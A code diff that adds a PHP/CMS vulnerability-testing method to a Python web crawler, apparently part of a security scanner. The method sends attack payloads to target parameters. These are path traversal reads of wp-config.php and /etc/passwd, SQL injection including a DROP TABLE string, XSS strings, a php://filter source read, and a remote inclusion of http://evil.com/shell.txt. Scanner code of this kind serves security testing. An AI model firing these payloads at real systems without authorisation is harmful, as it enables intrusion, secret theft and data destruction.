@@ -81,6 +81,7 @@ class SmartCrawler:
         
         self.js_files = set()  # Nueva lista para almacenar archivos JS
         self.js_findings = []  # Nueva lista para hallazgos en JS
+        self.php_files = set()  # Nueva lista para archivos PHP
         self.client = httpx.AsyncClient(timeout=timeout, follow_redirects=True)  # Cliente HTTP para descargar JS
         
         self.console.print_info("SmartCrawler initialized.")
@@ -1354,3 +1355,70 @@ class SmartCrawler:
             self.console.print_success(f"JavaScript files report saved to {report_path}")
         except Exception as e:
             self.console.print_error(f"Failed to write JS files report: {e}")
+
+    async def _test_php_vulnerabilities(self, php_url: str):
+        """Realiza pruebas de vulnerabilidades típicas de CMS en archivos PHP."""
+        self.console.print_debug(f"Testing PHP file for CMS vulnerabilities: {php_url}")
+        parsed_url = urlparse(php_url)
+        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
+
+        # Payloads típicos para CMS
+        cms_payloads = {
+            "Path Traversal": [
+                "../wp-config.php", "../../etc/passwd", "../..//etc//passwd",
+                "../includes/db_connect.php"  # Joomla/Drupal
+            ],
+            "SQL Injection": [
+                "1' OR 1=1 --", "1' UNION SELECT 1,2,3 --", "1; DROP TABLE users --"
+            ],
+            "XSS": [
+                "<script>alert('xss')</script>", "'><img src=x onerror=alert('xss')>",
+                "javascript:alert('xss')"
+            ],
+            "LFI/RFI": [
+                "php://filter/convert.base64-encode/resource=index.php",
+                "http://evil.com/shell.txt"
+            ],
+            "Admin Exposure": [
+                "/wp-admin/", "/admin/", "/administrator/", "/user/login"
+            ]
+        }
+
+        # Pruebas para cada categoría
+        for vuln_type, payloads in cms_payloads.items():
+            for payload in payloads:
+                test_params = {}
+                test_url = base_url
+                if vuln_type == "Admin Exposure":
+                    test_url = urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}/", payload)
+                else:
+                    # Asumimos un parámetro genérico 'id' o 'q' común en CMS
+                    test_params = {"id": payload, "q": payload}
+
+                self.console.print_debug(f"Testing {vuln_type} on {test_url} with payload: {payload}")
+                response = await self.client.get(test_url, params=test_params if test_params else None)
+                if response.status_code == 200 or response.status_code >= 500:
+                    # Reutilizar verificaciones de AttackEngine
+                    if vuln_type == "Path Traversal":
+                        is_vuln, details = self.attack_engine._verify_path_traversal(response, payload)
+                    elif vuln_type == "SQL Injection":
+                        is_vuln, details = await self.attack_engine._verify_sqli_error(response, 0, 0, payload, payload)
+                    elif vuln_type == "XSS":
+                        is_vuln, details = self.attack_engine._verify_xss_reflection(response, payload, "alert('xss')", "html" in response.headers.get("content-type", ""))
+                    elif vuln_type == "LFI/RFI":
+                        is_vuln, details = self.attack_engine._verify_path_traversal(response, payload)  # Similar a Path Traversal
+                    elif vuln_type == "Admin Exposure":
+                        body = response.text.lower()
+                        is_vuln = "login" in body or "admin" in body or "dashboard" in body
+                        details = "Possible admin panel exposed" if is_vuln else "No admin panel detected"
+                    
+                    if is_vuln:
+                        finding = {
+                            "url": test_url,
+                            "vuln_type": vuln_type,
+                            "payload": payload,
+                            "status": response.status_code,
+                            "details": details
+                        }
+                        self.console.print_warning(f"Potential {vuln_type} vulnerability in {test_url}: {details}")
+                        self.report_generator.add_findings("php_vulnerabilities", [finding])
